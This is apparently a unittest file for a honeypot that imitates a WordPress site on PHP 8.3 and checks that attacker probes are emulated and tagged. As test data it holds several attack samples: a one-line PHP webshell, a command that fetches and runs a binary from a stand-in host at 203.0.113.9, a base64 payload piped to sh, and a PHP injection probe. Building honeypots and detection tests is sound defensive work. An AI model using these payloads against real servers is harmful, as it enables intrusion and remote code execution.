"""WordPress persona tests (python -m unittest discover -s tests).

Author: Markus Fritz (wirehack7)
"""

import base64
import hashlib
import http.client
import json
import time
import unittest
from pathlib import Path

from helpers import (
    FORM_URLENCODED,
    ServerTestCase,
    multipart_body,
    multipart_headers,
)

DOWNLOAD_CMD = (
    "cd%20/tmp%3B%20wget%20http%3A//203.0.113.9/x86%3B"
    "%20chmod%20%2Bx%20x86%3B%20./x86"
)


class HoneypotTest(ServerTestCase):
    """End-to-end tests against the default WordPress persona."""

    def test_index_persona(self):
        """Index and phpinfo look like PHP 8.3 WordPress on Apache."""
        r, body = self.req("GET", "/")
        self.assertEqual(r.status, 200)
        self.assertEqual(r.getheader("Server"), "Apache/2.4.58 (Ubuntu)")
        self.assertTrue(r.getheader("X-Powered-By").startswith("PHP/8.3"))
        self.assertIn("PHP_SESSION_UPLOAD_PROGRESS", body)
        self.assertIn('content="WordPress 6.6.2"', body)
        self.assertIn("api.w.org", r.getheader("Link"))
        r, body = self.req("GET", "/phpinfo.php")
        self.assertIn("session.upload_progress.enabled", body)

    def test_wordpress_surface(self):
        """WordPress admin, REST, readme, 404 and login pages behave."""
        r, _ = self.req("GET", "/wp-admin/")
        self.assertEqual(r.status, 302)
        self.assertIn("/wp-login.php", r.getheader("Location"))
        r, body = self.req("GET", "/wp-json/")
        self.assertEqual(json.loads(body)["name"], "Example Logistics LLC")
        r, body = self.req("GET", "/readme.html")
        self.assertIn("WordPress", body)
        r, body = self.req("GET", "/does-not-exist/")
        self.assertEqual(r.status, 404)
        self.assertIn("Page not found", body)
        r, body = self.req(
            "POST",
            "/wp-login.php",
            "log=admin&pwd=hunter2",
            FORM_URLENCODED,
        )
        self.assertIn("is incorrect", body)
        ev = self.events("login_attempt")[-1]
        self.assertEqual(
            (ev["user"]["name"], ev["password"]), ("admin", "hunter2")
        )

    def test_sitemap(self):
        """robots.txt, sitemaps and author pages use the request host."""
        host = {"Host": "tidewell.test"}
        r, body = self.req("GET", "/robots.txt", headers=host)
        self.assertIn("Sitemap: http://tidewell.test/wp-sitemap.xml", body)
        r, body = self.req("GET", "/wp-sitemap.xml", headers=host)
        self.assertEqual(r.status, 200)
        self.assertIn(
            "<loc>http://tidewell.test/wp-sitemap-posts-post-1.xml</loc>", body
        )
        r, body = self.req(
            "GET", "/wp-sitemap-posts-post-1.xml", headers=host
        )
        self.assertIn(
            "<loc>http://tidewell.test/new-warehouse-opens/</loc>"
            "<lastmod>2026-10-14T00:00:00+00:00</lastmod>",
            body,
        )
        r, body = self.req(
            "GET", "/wp-sitemap-posts-page-1.xml", headers=host
        )
        self.assertIn("http://tidewell.test/careers/", body)
        r, body = self.req("GET", "/author/editor/")
        self.assertEqual(r.status, 200)
        self.assertIn("Author: editor", body)
        r, _ = self.req("GET", "/wp-sitemap-nope-1.xml")
        self.assertEqual(r.status, 404)

    def test_ajax_upload_json(self):
        """admin-ajax.php upload returns a JSON success with a file URL."""
        b = "----p2sAJAX"
        body = multipart_body(
            b,
            [
                ("PHP_SESSION_UPLOAD_PROGRESS", None, b"sfu_1"),
                ("action", None, b"sfu_upload"),
                ("sfu_file", "cv.pdf", b"%PDF-1.4 test"),
            ],
        )
        _, page = self.req(
            "POST", "/wp-admin/admin-ajax.php", body, multipart_headers(b)
        )
        d = json.loads(page)
        self.assertTrue(d["success"])
        self.assertTrue(
            d["data"]["files"][0]["url"].startswith("/wp-content/uploads/")
        )

    def test_upload_progress_probe_with_command(self):
        """A PHP2Shell probe is tagged and its command emulated."""
        cmd = base64.b64encode(b"echo P2S_CANARY_42; id; uname -a").decode()
        b = "----p2shellTEST"
        body = multipart_body(
            b,
            [
                (
                    "PHP_SESSION_UPLOAD_PROGRESS",
                    None,
                    f"x|echo {cmd}|base64 -d|sh".encode(),
                ),
                ("file", "a.txt", b"hello"),
            ],
        )
        r, page = self.req(
            "POST",
            "/upload.php",
            body,
            multipart_headers(b)
            | {
                "User-Agent": "php2shell-scan/109618",
                "Cookie": "PHPSESSID=abcdefabcdefabcdefabcdefabcdef12",
            },
        )
        self.assertEqual(r.status, 200)
        self.assertIn("P2S_CANARY_42", page)
        self.assertIn("uid=33(www-data)", page)
        ev = [
            e
            for e in self.events("http_request")
            if e["url"]["path"] == "/upload.php"
        ][-1]
        for t in (
            "php2shell.upload_progress_field",
            "php2shell.tool_user_agent",
            "php2shell.tool_boundary",
            "exploit.code_in_request",
        ):
            self.assertIn(t, ev["tags"])
        cmds = [
            e["process"]["command_line"]
            for e in self.events("command_emulated")
        ]
        self.assertIn("echo P2S_CANARY_42; id; uname -a", cmds)

    def test_oversized_body_returns_500(self):
        """An oversized multipart body is stored and answered with 500."""
        b = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        body = multipart_body(b, [("x", None, b"A" * (2 * 1024 * 1024))])
        r, _ = self.req("POST", "/", body, multipart_headers(b))
        self.assertEqual(r.status, 500)
        ev = self.events("http_request")[-1]
        self.assertEqual(ev["php2shell"]["stage"], "arm")
        self.assertIn("php2shell.oversized_body", ev["tags"])
        self.assertTrue(
            Path(ev["http"]["request"]["body"]["stored"]["path"]).exists()
        )

    def test_many_empty_filenames(self):
        """Many parts with empty filenames are tagged and get a 500."""
        b = "----atkX"
        body = multipart_body(
            b,
            [(f"f{i}", "", b"") for i in range(20)]
            + [(f"g{i}", "", b"x") for i in range(20)],
        )
        r, _ = self.req("POST", "/index.php", body, multipart_headers(b))
        ev = self.events("http_request")[-1]
        self.assertIn("php2shell.many_empty_filenames", ev["tags"])
        self.assertEqual(r.status, 500)

    def test_many_small_parts_get_200(self):
        """The php8find probe (1100 one-byte parts) gets a 200."""
        b = "gg"
        body = multipart_body(b, [(f"v{i}", None, b"x") for i in range(1100)])
        r, _ = self.req("POST", "/", body, multipart_headers(b))
        self.assertEqual(r.status, 200)
        ev = self.events("http_request")[-1]
        self.assertEqual(ev["php2shell"]["stage"], "probe")
        self.assertIn("php2shell.many_parts", ev["tags"])

    def test_webshell_upload_then_use(self):
        """An uploaded webshell is reachable and runs emulated commands."""
        b = "----webkit123"
        shell = b'<?php system($_GET["c"]); ?>'
        body = multipart_body(b, [("document", "s.phtml", shell)])
        r, page = self.req(
            "POST", "/upload.php", body, multipart_headers(b)
        )
        self.assertIn("/wp-content/uploads/", page)
        self.assertIn("/s.phtml", page)
        r, out = self.req(
            "GET", "/wp-content/uploads/2026/10/s.phtml?c=" + DOWNLOAD_CMD
        )
        self.assertEqual(r.status, 200)
        urls = [e["url"]["original"] for e in self.events("download_url_seen")]
        self.assertIn("http://203.0.113.9/x86", urls)
        ev = self.events("http_request")[-1]
        self.assertEqual(ev["php2shell"]["stage"], "post_exploitation")
        r, out = self.req(
            "POST",
            "/wp-content/uploads/2026/10/s.phtml",
            "c=whoami",
            FORM_URLENCODED,
        )
        self.assertEqual(out.strip(), "www-data")

    def test_php_md5_canary(self):
        """PHP code echoing an md5 canary gets the real hash back."""
        _, page = self.req(
            "GET", "/index.php?x=" + "%3C%3Fphp%20echo%20md5(%22p2s%22)%3B"
        )
        self.assertIn(hashlib.md5(b"p2s").hexdigest(), page)

    def test_chunked(self):
        """A chunked multipart upload is detected and tagged."""
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        b = "----p2sCHUNK"
        body = multipart_body(b, [("PHP_SESSION_UPLOAD_PROGRESS", None, b"z")])
        c.putrequest("POST", "/api/endpoint.php")
        c.putheader("Content-Type", f"multipart/form-data; boundary={b}")
        c.putheader("Transfer-Encoding", "chunked")
        c.endheaders()
        c.send(f"{len(body):x}\r\n".encode() + body + b"\r\n0\r\n\r\n")
        r = c.getresponse()
        r.read()
        c.close()
        time.sleep(0.05)
        ev = self.events("http_request")[-1]
        self.assertIn("php2shell.chunked_multipart", ev["tags"])
        self.assertIn("php2shell.upload_progress_field", ev["tags"])


if __name__ == "__main__":
    unittest.main()
